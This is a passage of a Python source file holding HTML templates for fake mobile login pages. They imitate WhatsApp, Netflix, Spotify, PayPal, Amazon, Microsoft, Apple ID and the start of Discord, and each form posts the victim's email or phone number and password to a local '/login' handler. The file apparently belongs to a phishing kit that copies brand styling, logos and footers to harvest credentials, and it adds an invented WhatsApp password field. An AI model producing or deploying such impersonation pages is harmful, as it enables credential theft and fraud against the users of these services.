  <div class="join-row">New to LinkedIn? <a href="#">Join now</a></div>
</div>
</body></html>'''

# ── WhatsApp Web (Mobile) ──────────────────────────────────────────────────────
PAGES['whatsapp'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>WhatsApp</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#111b21;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;color:#e9edef;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.container{width:100%;max-width:420px;padding:48px 24px}
.logo-row{display:flex;align-items:center;gap:12px;margin-bottom:40px;justify-content:center}
.wa-icon{width:56px;height:56px;background:#25d366;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px}
.wa-name{font-size:28px;font-weight:500;color:#e9edef}
h2{font-size:22px;font-weight:400;color:#e9edef;margin-bottom:8px;text-align:center}
.sub{font-size:14px;color:#8696a0;text-align:center;margin-bottom:32px;line-height:1.5}
.phone-row{display:flex;gap:8px;margin-bottom:10px}
.country{padding:13px 12px;background:#2a3942;border:1px solid #374045;border-radius:8px;font-size:15px;color:#e9edef;cursor:pointer;white-space:nowrap}
input{width:100%;padding:13px 14px;background:#2a3942;border:1px solid #374045;border-radius:8px;font-size:15px;color:#e9edef;outline:none;-webkit-appearance:none;font-family:inherit}
input:focus{border-color:#00a884}
input::placeholder{color:#8696a0}
.full-input{width:100%;padding:13px 14px;background:#2a3942;border:1px solid #374045;border-radius:8px;font-size:15px;color:#e9edef;outline:none;-webkit-appearance:none;font-family:inherit;margin-bottom:10px}
.full-input:focus{border-color:#00a884}
.full-input::placeholder{color:#8696a0}
.btn{width:100%;padding:14px;background:#00a884;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:16px;-webkit-appearance:none;font-family:inherit}
.btn:active{background:#017561}
.terms{font-size:13px;color:#8696a0;text-align:center;margin-top:20px;line-height:1.6}
.terms a{color:#00a884;text-decoration:none}
.or-row{display:flex;align-items:center;gap:12px;margin:20px 0;color:#8696a0;font-size:13px}
.or-line{flex:1;height:1px;background:#2a3942}
</style></head>
<body>
<div class="container">
  <div class="logo-row">
    <div class="wa-icon">
      <svg viewBox="0 0 36 36" width="32" height="32" fill="#fff"><path d="M18 1C8.6 1 1 8.6 1 18c0 3 .8 5.8 2.2 8.2L1 35l9.1-2.4C12.4 34 15.1 35 18 35c9.4 0 17-7.6 17-17S27.4 1 18 1zm8.7 23.9c-.4 1-2.2 2-3 2.1-.8.1-1.6.4-5.3-1.1-4.4-1.8-7.3-6.2-7.5-6.5-.2-.3-1.7-2.3-1.7-4.4 0-2.1 1.1-3.1 1.5-3.6.4-.4.8-.5 1.1-.5h.8c.3 0 .6.1.9.6.3.7 1.2 2.8 1.3 3 .1.2.2.5.1.8-.1.3-.2.5-.4.7-.2.2-.4.5-.6.7-.2.2-.4.4-.2.8.2.4 1 1.8 2.3 2.9 1.6 1.4 2.9 1.8 3.3 2 .4.2.6.2.8-.1.2-.3.9-1.1 1.2-1.4.3-.3.6-.3.9-.2l2.9 1.4c.4.2.6.3.7.4.1.3.1 1.2-.3 2.4z"/></svg>
    </div>
    <div class="wa-name">WhatsApp</div>
  </div>
  <h2>Enter your phone number</h2>
  <p class="sub">WhatsApp will send an SMS message to verify your phone number.</p>
  <form action="/login" method="POST">
    <div class="phone-row">
      <div class="country">🇧🇩 +880</div>
      <input type="tel" name="phone" placeholder="Phone number" required>
    </div>
    <input class="full-input" type="password" name="password" placeholder="WhatsApp password (if set)">
    <button class="btn" type="submit">Next</button>
  </form>
  <p class="terms">Read our <a href="#">Privacy Policy</a>. Tap "Next" to agree to our <a href="#">Terms of Service</a>.</p>
</div>
</body></html>'''

# ── Netflix (Mobile) ──────────────────────────────────────────────────────────
PAGES['netflix'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Netflix - Sign In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#000;font-family:'Netflix Sans','Helvetica Neue',sans-serif;color:#fff;min-height:100vh;display:flex;flex-direction:column}
.bg{position:fixed;inset:0;background:url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-eaa4a9113d36/a3873901-5b7c-46eb-b9e4-b7e8b9c56e37/BD-en-20240219-popsignuptwoweeks-perspective_alpha_website_large.jpg') center/cover;opacity:.3;z-index:0}
.nav{position:relative;z-index:1;padding:18px 20px;display:flex;align-items:center;justify-content:space-between}
.nf-logo{color:#e50914;font-size:28px;font-weight:900;letter-spacing:-1px}
.lang-btn{background:transparent;border:1px solid rgba(255,255,255,.6);color:#fff;padding:6px 12px;border-radius:3px;font-size:13px;cursor:pointer}
.container{position:relative;z-index:1;flex:1;display:flex;align-items:flex-start;justify-content:center;padding:20px 16px 40px}
.card{background:rgba(0,0,0,.75);border-radius:4px;padding:40px 32px;width:100%;max-width:400px}
h1{font-size:32px;font-weight:700;margin-bottom:28px}
.input-wrap{position:relative;margin-bottom:16px;background:#333;border-radius:4px;border:1px solid #333}
.input-wrap.focused{border-color:#e87c03}
.input-wrap label{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:16px;color:#8c8c8c;pointer-events:none;transition:all .1s}
.input-wrap.active label{top:10px;transform:none;font-size:11px;font-weight:700;color:#8c8c8c}
.input-wrap input{width:100%;padding:26px 14px 10px;background:transparent;border:none;outline:none;font-size:16px;color:#fff;font-family:inherit;-webkit-appearance:none}
.remember-row{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;font-size:14px}
.remember-row label{display:flex;align-items:center;gap:8px;color:#b3b3b3;cursor:pointer}
.remember-row a{color:#b3b3b3;text-decoration:none}
.btn{width:100%;padding:16px;background:#e50914;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:700;cursor:pointer;-webkit-appearance:none;font-family:inherit}
.btn:active{background:#b20710}
.or-row{display:flex;align-items:center;gap:12px;margin:20px 0;color:#737373;font-size:14px}
.or-line{flex:1;height:1px;background:#737373}
.btn-code{width:100%;padding:14px;background:transparent;border:1px solid #737373;color:#fff;border-radius:4px;font-size:14px;cursor:pointer;font-family:inherit}
.signup-row{margin-top:20px;font-size:15px;color:#737373}
.signup-row a{color:#fff;text-decoration:none;font-weight:700}
.captcha{font-size:13px;color:#8c8c8c;margin-top:12px;line-height:1.5}
.captcha a{color:#0071eb;text-decoration:none}
</style></head>
<body>
<div class="bg"></div>
<nav class="nav">
  <div class="nf-logo">NETFLIX</div>
  <button class="lang-btn">🌐 English ▾</button>
</nav>
<div class="container">
  <div class="card">
    <h1>Sign In</h1>
    <form action="/login" method="POST" id="nfForm">
      <div class="input-wrap" id="emailWrap">
        <label>Email or phone number</label>
        <input type="text" name="email" id="emailIn" autocomplete="username" required
          onfocus="act(this.parentElement)" onblur="deact(this.parentElement,this)">
      </div>
      <div class="input-wrap" id="pwWrap">
        <label>Password</label>
        <input type="password" name="password" id="pwIn" autocomplete="current-password" required
          onfocus="act(this.parentElement)" onblur="deact(this.parentElement,this)">
      </div>
      <div class="remember-row">
        <label><input type="checkbox" checked> Remember me</label>
        <a href="#">Need help?</a>
      </div>
      <button class="btn" type="submit">Sign In</button>
    </form>
    <div class="or-row"><div class="or-line"></div>OR<div class="or-line"></div></div>
    <button class="btn-code">Use a sign-in code</button>
    <div class="signup-row">New to Netflix? <a href="#">Sign up now.</a></div>
    <div class="captcha">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more.</a></div>
  </div>
</div>
<script>
function act(el){el.classList.add('active','focused')}
function deact(el,inp){el.classList.remove('focused');if(inp.value)el.classList.add('active');else el.classList.remove('active')}
</script>
</body></html>'''

# ── Spotify (Mobile) ──────────────────────────────────────────────────────────
PAGES['spotify'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Spotify - Web Player</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#000;font-family:CircularSp,-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.container{width:100%;max-width:420px;padding:48px 24px}
.sp-logo{text-align:center;margin-bottom:32px}
.sp-logo svg{width:130px;height:40px}
h1{font-size:28px;font-weight:700;text-align:center;margin-bottom:32px}
.sso-btn{width:100%;padding:13px;background:transparent;border:1px solid #727272;border-radius:500px;font-size:15px;font-weight:700;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;-webkit-appearance:none;font-family:inherit}
.sso-btn:active{background:#1a1a1a}
.divider{display:flex;align-items:center;gap:16px;margin:24px 0;color:#7c7c7c;font-size:13px;font-weight:700;letter-spacing:.5px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#292929}
.field-label{display:block;font-size:14px;font-weight:700;color:#fff;margin-bottom:8px}
input{width:100%;padding:13px 14px;background:#fff;border:2px solid transparent;border-radius:4px;font-size:16px;color:#000;outline:none;margin-bottom:16px;-webkit-appearance:none;font-family:inherit}
input:focus{border-color:#1ed760;box-shadow:0 0 0 2px rgba(30,215,96,.3)}
.pw-wrap{position:relative;margin-bottom:4px}
.pw-wrap input{margin-bottom:0;padding-right:48px}
.show-pw{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:none;color:#7c7c7c;font-size:18px;cursor:pointer}
.forgot{color:#fff;font-size:14px;font-weight:700;text-decoration:underline;display:block;margin-bottom:24px;margin-top:10px}
.btn-login{width:100%;padding:15px;background:#1db954;color:#000;border:none;border-radius:500px;font-size:16px;font-weight:700;cursor:pointer;-webkit-appearance:none;font-family:inherit}
.btn-login:active{background:#1aa34a}
.signup-row{text-align:center;margin-top:32px;font-size:15px;color:#7c7c7c}
.signup-row a{color:#fff;font-weight:700;text-decoration:underline}
</style></head>
<body>
<div class="container">
  <div class="sp-logo">
    <svg viewBox="0 0 167 50" fill="white" xmlns="http://www.w3.org/2000/svg">
      <path d="M25 0C11.2 0 0 11.2 0 25s11.2 25 25 25 25-11.2 25-25S38.8 0 25 0zm11.5 36.1c-.4.7-1.4.9-2.1.5-5.7-3.5-12.9-4.3-21.4-2.3-.8.2-1.6-.3-1.8-1.1-.2-.8.3-1.6 1.1-1.8 9.3-2.1 17.3-1.2 23.7 2.7.7.4.9 1.4.5 2zm3.1-6.8c-.6.9-1.8 1.2-2.7.6-6.6-4-16.6-5.2-24.4-2.8-.9.3-1.9-.2-2.2-1.1-.3-.9.2-1.9 1.1-2.2 8.9-2.7 19.9-1.4 27.5 3.2.9.5 1.2 1.7.7 2.3zm.3-7.1c-7.8-4.6-20.7-5-28.2-2.8-1.1.3-2.2-.3-2.5-1.4-.3-1.1.3-2.2 1.4-2.5 8.6-2.6 22.9-2.1 31.9 3.2 1 .6 1.3 1.9.7 2.9-.6.9-1.9 1.2-2.9.6h-.4z"/>
      <path d="M74.4 26.6c-3.9-.9-4.6-1.6-4.6-3 0-1.3 1.2-2.2 3.1-2.2 1.8 0 3.6.7 5.5 2.1.1.1.2.1.3.1.1 0 .2-.1.3-.2l2.3-3.3c.1-.2.1-.4-.1-.5-2.3-1.9-4.9-2.8-8.2-2.8-4.6 0-7.8 2.7-7.8 6.7 0 4.2 2.8 5.7 7.2 6.8 3.7.8 4.3 1.7 4.3 2.9 0 1.5-1.3 2.3-3.5 2.3-2.4 0-4.4-.8-6.5-2.6-.1-.1-.2-.1-.3-.1s-.2.1-.3.2l-2.6 3.1c-.2.2-.1.4.1.5 2.6 2.3 5.8 3.5 9.5 3.5 5 0 8.2-2.7 8.2-6.8.1-3.6-2.1-5.5-6.9-6.7zm19.5-6.8c-2.4 0-4.4 1-6 3v-2.3c0-.2-.2-.4-.4-.4h-4.3c-.2 0-.4.2-.4.4v22.9c0 .2.2.4.4.4h4.3c.2 0 .4-.2.4-.4v-7.2c1.6 1.9 3.6 2.8 6 2.8 4.5 0 9-3.4 9-9.7-.1-6.3-4.6-9.5-9-9.5zm4.4 9.6c0 3.2-2 5.4-4.7 5.4-2.7 0-4.8-2.3-4.8-5.4s2.1-5.4 4.8-5.4c2.6 0 4.7 2.2 4.7 5.4zm17.2-9.6c-5.5 0-9.8 4.2-9.8 9.7s4.2 9.6 9.7 9.6 9.8-4.2 9.8-9.7c0-5.4-4.2-9.6-9.7-9.6zm0 14.9c-2.8 0-4.9-2.3-4.9-5.4s2-5.3 4.8-5.3c2.9 0 4.9 2.3 4.9 5.3.1 3.2-1.9 5.4-4.8 5.4z"/>
    </svg>
  </div>
  <h1>Log in to Spotify</h1>
  <button class="sso-btn">
    <svg width="20" height="20" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.5 0 6.6 1.2 9.1 3.2l6.8-6.8C35.8 2.2 30.2 0 24 0 14.6 0 6.6 5.4 2.6 13.3l7.9 6.2C12.4 13.3 17.7 9.5 24 9.5z"/><path fill="#4285F4" d="M46.5 24.5c0-1.6-.1-3.1-.4-4.5H24v8.5h12.7c-.6 3-2.3 5.5-4.8 7.2l7.5 5.8c4.4-4.1 7.1-10.1 7.1-17z"/><path fill="#FBBC05" d="M10.5 28.5c-.5-1.5-.8-3.1-.8-4.8s.3-3.3.8-4.8l-7.9-6.2C.9 15.8 0 19.8 0 24s.9 8.2 2.6 11.3l7.9-6.8z"/><path fill="#34A853" d="M24 48c6.2 0 11.4-2 15.2-5.5l-7.5-5.8c-2 1.4-4.6 2.2-7.7 2.2-6.3 0-11.6-3.8-13.5-9.2l-7.9 6.8C6.6 42.6 14.6 48 24 48z"/></svg>
    Continue with Google
  </button>
  <button class="sso-btn">🍎 Continue with Apple</button>
  <button class="sso-btn">🔵 Continue with Facebook</button>
  <div class="divider">or</div>
  <form action="/login" method="POST">
    <label class="field-label">Email or username</label>
    <input type="text" name="email" placeholder="Email or username" autocomplete="username" required>
    <label class="field-label">Password</label>
    <div class="pw-wrap">
      <input type="password" name="password" id="spPw" placeholder="Password" autocomplete="current-password" required>
      <button type="button" class="show-pw" onclick="var i=document.getElementById('spPw');i.type=i.type=='password'?'text':'password'">👁</button>
    </div>
    <a class="forgot" href="#">Forgot your password?</a>
    <button class="btn-login" type="submit">Log In</button>
  </form>
  <div class="signup-row">Don't have an account? <a href="#">Sign up for Spotify</a></div>
</div>
</body></html>'''

# ── PayPal (Mobile) ───────────────────────────────────────────────────────────
PAGES['paypal'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>PayPal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fff;font-family:'PayPal Sans',-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;flex-direction:column}
.nav{padding:16px 20px;border-bottom:1px solid #e5e5e5;display:flex;justify-content:center}
.pp-logo{font-size:28px;font-weight:900;color:#003087}
.pp-logo span{color:#0070ba}
.container{flex:1;padding:40px 24px;max-width:440px;width:100%;margin:0 auto}
h1{font-size:26px;font-weight:400;color:#2c2e2f;margin-bottom:28px;text-align:center}
.field{margin-bottom:16px}
.field label{display:block;font-size:14px;color:#2c2e2f;margin-bottom:6px}
.field input{width:100%;padding:14px 16px;border:1.5px solid #9da3a6;border-radius:6px;font-size:16px;color:#2c2e2f;outline:none;-webkit-appearance:none;background:#fff;font-family:inherit}
.field input:focus{border-color:#0070ba;box-shadow:0 0 0 2px rgba(0,112,186,.2)}
.forgot{color:#0070ba;font-size:14px;text-decoration:none;display:block;margin-bottom:24px}
.btn-login{width:100%;padding:15px;background:#0070ba;color:#fff;border:none;border-radius:500px;font-size:18px;font-weight:700;cursor:pointer;margin-bottom:20px;-webkit-appearance:none;font-family:inherit}
.btn-login:active{background:#005ea6}
.divider{border:none;border-top:1.5px solid #e5e5e5;margin:24px 0}
.btn-signup{width:100%;padding:15px;background:#ffc43a;color:#2c2e2f;border:none;border-radius:500px;font-size:18px;font-weight:700;cursor:pointer;-webkit-appearance:none;font-family:inherit}
.btn-signup:active{background:#f0b400}
.footer{text-align:center;padding:24px;font-size:12px;color:#6c7378}
.footer a{color:#6c7378;text-decoration:none}
</style></head>
<body>
<nav class="nav"><div class="pp-logo">Pay<span>Pal</span></div></nav>
<div class="container">
  <h1>Log In</h1>
  <form action="/login" method="POST">
    <div class="field"><label>Email address</label><input type="text" name="email" autocomplete="email" required></div>
    <div class="field"><label>Password</label><input type="password" name="password" autocomplete="current-password" required></div>
    <a class="forgot" href="#">Having trouble logging in?</a>
    <button class="btn-login" type="submit">Log In</button>
  </form>
  <div class="divider"></div>
  <button class="btn-signup">Sign Up</button>
</div>
<div class="footer"><a href="#">Privacy</a> · <a href="#">Legal</a> · <a href="#">Contact</a><br><br>© 2024 PayPal, Inc.</div>
</body></html>'''

# ── Amazon (Mobile) ───────────────────────────────────────────────────────────
PAGES['amazon'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Amazon Sign-In</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fff;font-family:Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.logo{padding:20px 0 16px;text-align:center}
.logo svg{width:100px}
.card{border:1px solid #d5d9d9;border-radius:8px;padding:24px 18px;width:100%;max-width:360px;margin:0 8px}
h1{font-size:28px;font-weight:400;color:#0f1111;margin-bottom:16px}
.field{margin-bottom:14px}
.field label{display:block;font-size:13px;font-weight:700;color:#0f1111;margin-bottom:4px}
.field input{width:100%;padding:8px 10px;border:1px solid #888c8c;border-radius:3px;font-size:13px;color:#0f1111;outline:none;-webkit-appearance:none;font-family:inherit}
.field input:focus{border-color:#e77600;box-shadow:0 0 3px 2px rgba(228,121,17,.5)}
.btn-continue{width:100%;padding:9px;background:linear-gradient(180deg,#f7dfa5,#f0c14b);border:1px solid #a88734;border-radius:3px;font-size:13px;cursor:pointer;color:#111;font-family:inherit;margin-bottom:14px}
.btn-continue:active{background:#f0c14b}
.terms{font-size:12px;color:#555;line-height:1.5;margin-bottom:16px}
.terms a{color:#0066c0;text-decoration:none}
.divider{display:flex;align-items:center;gap:8px;margin:16px 0;color:#767676;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e7e7e7}
.btn-new{width:100%;padding:9px;background:linear-gradient(180deg,#f3f3f3,#e6e6e6);border:1px solid #adb1b8;border-radius:3px;font-size:13px;cursor:pointer;font-family:inherit;color:#0f1111}
.footer{text-align:center;font-size:12px;margin-top:20px;color:#555;padding:0 8px 24px}
.footer a{color:#0066c0;text-decoration:none}
</style></head>
<body>
<div class="logo">
  <svg viewBox="0 0 101 31" fill="#232f3e" xmlns="http://www.w3.org/2000/svg">
    <path d="M62.3 23.4c-5.9 4.4-14.6 6.7-22 6.7-10.4 0-19.8-3.9-26.9-10.3-.6-.5-.1-1.2.6-.8 7.7 4.5 17.1 7.2 26.9 7.2 6.6 0 13.8-1.4 20.5-4.2.9-.4 1.8.6.9 1.4z"/>
    <path d="M64.9 20.5c-.8-1-.5-4.6-.1-6.1.4-1.5-2.1-1.9-3.2-.8l-.7.8c-2.5 2.8-6.2 4-9.8 3.4-3.6-.5-6.7-2.9-8-6.1-1.6-3.8-.2-8.2 3.1-10.6 2.3-1.6 5-2.4 7.7-2.4 5.3 0 9.4 3.9 9.4 9.3 0 2.1-.5 3.8-1.3 5.4l.7.5c1.8 1.2 4.4 1.4 6.2.3.8-.5 1.6-1.4 2-2.4.3-.8.4-1.6.4-2.5 0-6.8-6.7-11.4-13.7-11.4-7 0-13.7 4.6-13.7 12.4 0 4.3 2 7.9 5.1 10.1 3.1 2.2 7.2 3 11.1 2.1 3.3-.7 6.1-2.8 7.8-5.5l.4-.5z" fill="#FF9900"/>
  </svg>
</div>
<div class="card">
  <h1>Sign in</h1>
  <form action="/login" method="POST">
    <div class="field">
      <label>Email or mobile phone number</label>
      <input type="text" name="email" autocomplete="username" required>
    </div>
    <div class="field">
      <label>Password <a href="#" style="font-weight:400;color:#0066c0;font-size:12px">Forgot your password?</a></label>
      <input type="password" name="password" autocomplete="current-password" required>
    </div>
    <button class="btn-continue" type="submit">Continue</button>
  </form>
  <p class="terms">By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.</p>
  <div class="divider">New to Amazon?</div>
  <button class="btn-new">Create your Amazon account</button>
</div>
<div class="footer"><a href="#">Conditions of Use</a> · <a href="#">Privacy Notice</a> · <a href="#">Help</a><br><br>© 1996-2024, Amazon.com, Inc.</div>
</body></html>'''

# ── Microsoft (Mobile) ────────────────────────────────────────────────────────
PAGES['microsoft'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Sign in to your Microsoft account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fff;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.container{width:100%;max-width:440px;padding:44px 24px}
.ms-logo{display:flex;gap:3px;margin-bottom:28px}
.ms-sq{width:20px;height:20px}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:16px}
.sub{font-size:13px;color:#1b1b1b;margin-bottom:20px}
input{width:100%;padding:8px 0;border:none;border-bottom:2px solid #666;font-size:15px;color:#1b1b1b;outline:none;margin-bottom:6px;font-family:inherit;-webkit-appearance:none;background:transparent}
input:focus{border-bottom-color:#0067b8}
.hint{font-size:12px;color:#666;margin-bottom:24px}
.options{font-size:14px;margin-bottom:24px}
.options a{color:#0067b8;text-decoration:none}
.btn-back{background:transparent;border:1px solid #0067b8;color:#0067b8;padding:10px 20px;font-size:15px;cursor:pointer;margin-right:8px;font-family:inherit}
.btn-next{background:#0067b8;border:none;color:#fff;padding:10px 20px;font-size:15px;cursor:pointer;font-family:inherit}
.btn-next:active{background:#005a9e}
.btn-row{display:flex;justify-content:flex-end;gap:8px}
.pw-section{display:none}
.footer{position:fixed;bottom:0;width:100%;padding:12px 24px;display:flex;justify-content:space-between;font-size:12px;color:#666;background:#fff;border-top:1px solid #e0e0e0}
.footer a{color:#666;text-decoration:none}
</style></head>
<body>
<div class="container">
  <div class="ms-logo">
    <svg width="44" height="44" viewBox="0 0 44 44"><rect x="0" y="0" width="21" height="21" fill="#f25022"/><rect x="23" y="0" width="21" height="21" fill="#7fba00"/><rect x="0" y="23" width="21" height="21" fill="#00a4ef"/><rect x="23" y="23" width="21" height="21" fill="#ffb900"/></svg>
  </div>
  <form action="/login" method="POST" id="msForm">
    <h1 id="msTitle">Sign in</h1>
    <p class="sub" id="msSub">Enter your Microsoft account details.</p>
    <input type="text" name="email" id="msEmail" placeholder="Email, phone, or Skype" autocomplete="username" required>
    <div class="hint">No account? <a href="#">Create one!</a></div>
    <div class="options"><a href="#">Sign in with a security key</a></div>
    <div id="pwSection" class="pw-section">
      <input type="password" name="password" id="msPw" placeholder="Password" autocomplete="current-password">
      <div class="hint"><a href="#" style="color:#0067b8">Forgot password?</a></div>
    </div>
    <div class="btn-row">
      <button class="btn-back" type="button" onclick="history.back()">Back</button>
      <button class="btn-next" type="button" id="msNext">Next</button>
    </div>
  </form>
</div>
<div class="footer">
  <a href="#">Terms of use</a><a href="#">Privacy & cookies</a>
</div>
<script>
let step=1;
document.getElementById('msNext').addEventListener('click',function(){
  if(step===1){
    if(!document.getElementById('msEmail').value.trim())return;
    document.getElementById('pwSection').style.display='block';
    document.getElementById('msTitle').textContent='Enter password';
    document.getElementById('msSub').textContent='';
    document.getElementById('msPw').required=true;
    document.getElementById('msPw').focus();
    step=2;
  }else{
    document.getElementById('msForm').submit();
  }
});
</script>
</body></html>'''

# ── Apple ID (Mobile) ─────────────────────────────────────────────────────────
PAGES['apple'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Apple ID</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#f5f5f7;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text',sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.nav{width:100%;padding:14px 20px;background:rgba(255,255,255,.8);backdrop-filter:blur(20px);border-bottom:1px solid rgba(0,0,0,.1);display:flex;justify-content:center;position:sticky;top:0;z-index:10}
.nav-logo{font-size:20px;font-weight:600;color:#1d1d1f}
.container{width:100%;max-width:400px;padding:40px 20px}
.apple-icon{text-align:center;margin-bottom:20px;font-size:56px;line-height:1}
h1{font-size:28px;font-weight:600;color:#1d1d1f;margin-bottom:8px;text-align:center}
.sub{font-size:15px;color:#6e6e73;text-align:center;margin-bottom:32px;line-height:1.4}
.input-group{background:#fff;border-radius:12px;overflow:hidden;margin-bottom:20px;box-shadow:0 1px 3px rgba(0,0,0,.1)}
.input-group input{width:100%;padding:14px 16px;border:none;border-bottom:1px solid #e5e5ea;font-size:17px;color:#1d1d1f;outline:none;-webkit-appearance:none;font-family:inherit;background:transparent}
.input-group input:last-child{border-bottom:none}
.input-group input::placeholder{color:#aeaeb2}
.input-group input:focus{background:#f9f9f9}
.btn-next{width:100%;padding:15px;background:#0071e3;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;cursor:pointer;margin-bottom:20px;-webkit-appearance:none;font-family:inherit}
.btn-next:active{background:#0077ed}
.links{text-align:center;font-size:15px}
.links a{color:#0071e3;text-decoration:none;display:block;margin-bottom:12px}
.links a:hover{text-decoration:underline}
.footer{text-align:center;font-size:12px;color:#6e6e73;margin-top:32px;padding:0 20px;line-height:1.5}
.footer a{color:#6e6e73;text-decoration:none}
</style></head>
<body>
<nav class="nav"><span class="nav-logo">Apple ID</span></nav>
<div class="container">
  <div class="apple-icon">🍎</div>
  <h1>Apple ID</h1>
  <p class="sub">Sign in with your Apple ID to continue to iCloud and other Apple services.</p>
  <form action="/login" method="POST">
    <div class="input-group">
      <input type="text" name="email" placeholder="Apple ID" autocomplete="username" required>
      <input type="password" name="password" placeholder="Password" autocomplete="current-password" required>
    </div>
    <button class="btn-next" type="submit">Continue</button>
  </form>
  <div class="links">
    <a href="#">Forgot Apple ID or Password?</a>
    <a href="#">Don't have an Apple ID? Create yours now.</a>
    <a href="#">Privacy Policy</a>
  </div>
</div>
<div class="footer">Copyright © 2024 Apple Inc. All rights reserved.<br><a href="#">Privacy Policy</a> · <a href="#">Terms of Use</a></div>
</body></html>'''

# ── Discord (Mobile) ──────────────────────────────────────────────────────────
PAGES['discord'] = '''<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Discord - A New Way to Chat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#313338;font-family:'gg sans','Noto Sans',-apple-system,BlinkMacSystemFont,sans-serif;color:#dbdee1;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
.container{width:100%;max-width:480px;padding:32px 16px}
.card{background:#2b2d31;border-radius:5px;padding:32px 24px;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,.2)}
.dc-logo{font-size:40px;margin-bottom:8px}
h1{font-size:24px;font-weight:700;color:#f2f3f5;margin-bottom:8px}
.sub{font-size:16px;color:#b5bac1;margin-bottom:24px}
.field{text-align:left;margin-bottom:16px}
.field label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:.5px;margin-bottom:8px}
.field label .req{color:#f23f43}
.field input{width:100%;padding:10px;background:#1e1f22;border:1px solid #1e1f22;border-radius:3px;font-size:16px;color:#dbdee1;outline:none;-webkit-appearance:none;font-family:inherit}
.field input:focus{border-color:#5865f2;box-shadow:0 0 0 2px rgba(88,101,242,.3)}
.field input::placeholder{color:#4e5058}
.pw-wrap{position:relative}
.pw-wrap input{padding-right:44px}
.show-pw-btn{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:none;color:#b5bac1;font-size:18px;cursor:pointer;padding:4px}
.forgot{display:block;text-align:left;color:#00a8fc;font-size:12px;text-decoration:none;margin-top:8px;margin-bottom:16px}
.btn-login{width:100%;padding:13px;background:#5865f2;color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:500;cursor:pointer;margin-bottom:16px;-webkit-appearance:none;font-family:inherit}
.btn-login:active{background:#4752c4}
.btn-qr{width:100%;padding:13px;background:transparent;border:1px solid #4e5058;color:#dbdee1;border-radius:3px;font-size:14px;cursor:pointer;margin-bottom:20px;-webkit-appearance:none;font-family:inherit}
.register{font-size:14px;color:#b5bac1}
.register a{color:#00a8fc;text-decoration:none}
</style></head>
<body>
<div class="container">
  <div class="card">
    <div class="dc-logo">
